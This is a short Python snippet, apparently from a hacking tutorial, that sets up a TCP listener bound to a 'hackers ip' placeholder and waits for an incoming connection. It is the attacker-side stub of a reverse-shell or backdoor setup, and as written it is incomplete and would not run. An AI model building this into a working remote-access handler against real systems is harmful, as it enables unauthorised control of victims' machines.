import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("hackers ip" , open_port_no ))
listener.listen(0)
print("[+] Waiting for incoming connection")
listener.accept()
print("[+] Connection established")
